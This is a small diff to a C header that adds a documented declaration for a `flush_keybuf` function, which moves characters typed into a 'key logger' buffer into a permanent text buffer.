@@ -45,4 +45,12 @@ void sprint_keybuf(
         char                  **s
 );
 
+/*
+ * Empties the buffer of the key logger, appending all typed characters to the
+ * permenant buffer in `text`.
+ */
+int flush_keybuf(
+        void
+);
+
 #endif
